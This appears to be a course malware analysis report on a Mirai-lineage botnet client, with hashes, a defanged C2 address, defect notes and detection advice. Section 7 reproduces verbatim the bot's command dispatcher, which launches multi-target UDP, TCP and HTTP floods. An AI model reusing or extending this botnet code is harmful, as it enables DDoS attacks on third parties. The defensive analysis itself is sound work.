# AzulaC2: Anatomy of a Mirai-Lineage Client

**Author:** [NAME] · **Course:** [COURSE] · **Date:** 2026-11-03 · **TLP:** CLEAR

> **Handling notice.** Static source-level analysis. No live command-and-control infrastructure was contacted. No code was executed against any target. All network indicators are defanged. Code excerpts reproduced for defensive study only.

## Abstract
We dissect *AzulaC2*, a Mirai-lineage Linux botnet client recovered as source. The client speaks a plaintext, line-oriented protocol over telnet-adjacent sockets, dispatches seven DDoS verbs through an unauthenticated `strcmp` chain, and forks one worker per target. Two divergent builds were recovered. One hardcoded endpoint. One memory-safety defect in the operator-facing parser. The build is operationally immature but the command surface is complete. What follows is the anatomy.

## 1. Introduction
Mirai is old. The lineage is not. Every few months a new fork appears with a fresh name, a fresh C2, and the same seven verbs under a new skin. The interesting question is never *whether* a build is Mirai-lineage — it always is — but *what the author changed and what they got wrong*. This paper answers that for AzulaC2.

## 2. Related Work
Prior analyses of Mirai and its forks establish the lineage traits: telnet scanning, plaintext line protocols, raw-socket floods [1–3]. This paper contributes a variant-level dispatch table and documents an argument-validation defect that canonical Mirai does not share.

## 3. Methodology
Static analysis only, in an isolated environment. No dynamic execution, no packet capture, no C2 contact. Artifacts are hashed for reproducibility. Raw pattern matches were triaged by hand to remove include directives and comments. Function bodies were extracted by line-range slicing from a symbol index rather than by brace counting, which is fragile on preprocessed C.

## 4. Artifacts
Trust the hash, not the filename. Every recovered file is fingerprinted below.

```
77522ba8f5761ff6c1220f822a1b1a59bbdb837cacf4a50741ed2ab8847b322a  359b1cdea85d65fc164062646224ab44.c
e1c25f901c33186a08527bf08efebc29041f8355690c7c9285d4a30fa463a20f  ebeaef203b09fcfdde7895f0c587faa8.c
50de6cf916716c87e02c176b32993d3c3b4a3e7f4a68f75a1526e51fb80468fb  processCmd.c
ca61aaaf1e92e02523a9767ed82e6087292d8252e9e4ab9f68565e5f71790cef  telnetListener.c
d26181a5144eb7b19d5d68582544dd6e6931a6521049d45e6dfb7c78cd8860c2  telnetWorker.c
88e904a5312bd6e5cbcef5a6130b3e63408875fa89a8c5afc9152b77a2e349a2  headers/MenuGUIs.h
309538d1930b3e02249e83f6c7374d537d454f24e7d23aecf94920e1ae7f4233  headers/SysInfo.h
4a2a3fdf184392003c133c9d0cd6113598767104c3a826037fe7ea59d506ed15  headers/headers.h
8062cf48c35c92c7d5aae5a0b2ecf9f988295dbecd7a0548064b58e881e3234c  headers/replace.h
```

## 5. Two Builds, Not One
```
 38470 359b1cdea85d65fc164062646224ab44.c
157095 ebeaef203b09fcfdde7895f0c587faa8.c
195565 total
```
The size delta is not a patch. The larger build rewrites the include block and a substantial set of preprocessor definitions. These are two development lines, not one codebase with a diff.

## 6. The C2
```
42:unsigned char* AzPRC[] = { "155[.]138[.]211[.]25[:]131" };
```
One hardcoded endpoint. No fallback, no backup, no rotation. Either a test build or an author who has not yet scaled. The `FAKENAME` definition elsewhere in the source masquerades the process as `/sbin/init`. The author understands Linux process camouflage. The infrastructure does not yet match the ambition.

## 7. The Parser
This is the interesting part. The dispatch routine, verbatim.

```c
void processCmd(int argc, unsigned char* argv[])
{
    if (!strcmp(argv[0], "UDP"))
    {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
        {
            return;
        }

        unsigned char* ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int packetsize = atoi(argv[5]);
        int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);

        if (strstr(ip, ",") != NULL)
        {
            unsigned char* ip = strtok(ip, ",");
            while (ip != NULL)
            {
                if (!listFork())
                {
                    audp(ip, port, time, spoofed, packetsize, pollinterval);
                    close(mainCommSock);
                    _exit(0);
                }
                ip = strtok(NULL, ",");
            }
        }
        else {
            if (listFork()) { return; }
            audp(ip, port, time, spoofed, packetsize, pollinterval);
            close(mainCommSock);

            _exit(0);
        }
    }
    if (!strcmp(argv[0], "STD"))
    {
        if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char* ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if (strstr(ip, ",") != NULL)
        {
            unsigned char* ip = strtok(ip, ",");
            while (ip != NULL)
            {
                if (!listFork())
                {
                    astd(ip, port, time);
                    _exit(0);
                }
                ip = strtok(NULL, ",");
            }
        }
        else {
            if (listFork()) { return; }
            astd(ip, port, time);
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "TCP"))
    {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }

        unsigned char* ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char* flags = argv[5];

        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;

        if (strstr(ip, ",") != NULL)
        {
            unsigned char* ip = strtok(ip, ",");
            while (ip != NULL)
            {
                if (!listFork())
                {
                    atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                    close(mainCommSock);
                    _exit(0);
                }
                ip = strtok(NULL, ",");
            }
        }
        else {
            if (listFork()) { return; }
            atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
            close(mainCommSock);

            _exit(0);
        }
    }

    if (!strcmp(argv[0], "HTTP"))
    {
        unsigned char* method = argv[1];
        unsigned char* target = argv[2];
        int port = atoi(argv[3]);
        unsigned char* path = argv[4];
        int time = atoi(argv[5]);
        int power = atoi(argv[6]);

        SendHTTP(method, target, port, path, time, power);
        close(mainCommSock);
        _exit(0);
    }

    if (!strcmp(argv[0], "STOMP"))
    {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }
        unsigned char* ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char* flags = argv[5];
        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
        if (strstr(ip, ",") != NULL)
        {
            unsigned char* ip = strtok(ip, ",");
            while (ip != NULL)
            {
                if (!listFork())
                {
                    astd(ip, port, time);
                    audp(ip, port, time, spoofed, packetsize, pollinterval);
                    close(mainCommSock);
                    _exit(0);
                }
                ip = strtok(NULL, ",");
            }
        }
        else {
            if (listFork()) { return; }
            astd(ip, port, time);
            audp(ip, port, time, spoofed, packetsize, pollinterval);
            close(mainCommSock);
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "CRUSH"))
    {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }
        unsigned char* ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char* flags = argv[5];
        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
        int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
        int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
        if (strstr(ip, ",") != NULL)
        {
            unsigned char* ip = strtok(ip, ",");
            while (ip != NULL)
            {
                if (!listFork())
                {
                    astd(ip, port, time);
                    atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                    close(mainCommSock);
                    _exit(0);
                }
                ip = strtok(NULL, ",");
            }
        }
        else {
            if (listFork()) { return; }
            astd(ip, port, time);
            atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
            close(mainCommSock);
            _exit(0);
        }
    }

    if (!strcmp(argv[0], "STOP"))
    {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }

        if (killed > 0)
        {
        }
        else {
        }

    }
}
```

### Table 1 — The Seven Verbs
| Verb | Handler | Effect | Note |
|---|---|---|---|
| UDP | audp() | Raw UDP flood | Comma-list fan-out |
| STD | astd() | STD flood | Fan-out |
| TCP | atcp() | Raw TCP flood | Flags string; fan-out |
| HTTP | SendHTTP() | HTTP flood | No argument check |
| STOMP | astd()+audp() | STD then UDP | Fan-out |
| CRUSH | astd()+atcp() | STD then TCP | Fan-out |
| STOP | kill(pid,9) | Kill workers | Process table walk |

## 8. What It Gets Wrong
**No authentication.** There is no token, no MAC, no nonce. Anyone who reaches the control port speaks the language of the operator. This is not a vulnerability in the target. It is a vulnerability in the bot.

**HTTP out-of-bounds read.** The HTTP verb reads a further argument without checking argument count. A short operator command triggers an out-of-bounds read in the bot. The parser trusts its own operator. That is a design assumption, not a security control.

**Single endpoint.** One hardcoded C2. One point of failure. Takedown of a single IP neuters the entire deployment.

**Comma-list fan-out.** Every flood verb except HTTP accepts a comma-separated target list. One operator command reaches many targets. Force multiplier.

**Input bounds present.** Spoof flags above 32 and packet sizes above 65500 are rejected. The author added anti-abuse guards against malformed operator input. Someone was thinking.

## 9. Capability Table
| Capability | Evidence | Confidence |
|---|---|---|
| C2 beacon and connect | connectTimeout, AzPRC[] | High |
| Command dispatch | recvLine to processCmd | High |
| UDP flood | audp, makeIPPacket | High |
| TCP flood | atcp, tcpcsum | High |
| HTTP flood | SendHTTP | High |
| Daemonization | fork() | High |
| Telnet control | telnetListener, telnetWorker | High |
| Process camouflage | FAKENAME /sbin/init | High |

## 10. Indicators of Compromise
```
"155[.]138[.]211[.]25[:]131"
```
Defanged. The resolver constant `8.8.8.8` was excluded as non-operational. See Appendix A.

## 11. Discussion
What does it mean when a build this immature still ships the full seven-verb DDoS surface? It means the hard part of writing a botnet is not the floods. The floods are public code, copied from Mirai, adapted to taste. The hard part is infrastructure, and this build has not solved it. One endpoint. No auth. A parser that trusts its own operator.

For defenders the signal is clear. A process masquerading as `/sbin/init` that opens an outbound socket to a single non-standard port is a high-fidelity detection. The protocol is plaintext. The verbs are matchable on the wire. This is not a stealthy adversary. It is a noisy one with a working command surface and no operational maturity.

## 12. Limitations
- Static only. No dynamic execution, no packet capture, no C2 contact.
- Pattern matches triaged by hand; false positives possible.
- Lineage claims rest on structural similarity, not binary-level comparison.

## 13. Conclusion
AzulaC2 is a Mirai-lineage Linux botnet client. We reconstructed its architecture, documented a seven-verb dispatch surface, defanged its indicators, and identified an argument-validation defect that distinguishes it from canonical Mirai. All analysis remained static and isolated.

## References
1. Antonakakis et al., *Understanding the Mirai Botnet*, USENIX Security, 2017.
2. [Variant study — to be filled]
3. [Botnet measurement — to be filled]

## Appendix A — Handling Policy
All network indicators are defanged (`[.]`, `[:]`) to prevent accidental resolution. Original values withheld per responsible-disclosure practice. Artifact hashes in section 4 permit independent verification without exposing live infrastructure.

---
*AzulaC2 static analysis · No live infrastructure contacted · Indicators defanged · Generated 2026-11-03T05:51:47Z*

*This document is a defensive analysis artifact. Code excerpts reproduced for study. Do not deploy.*
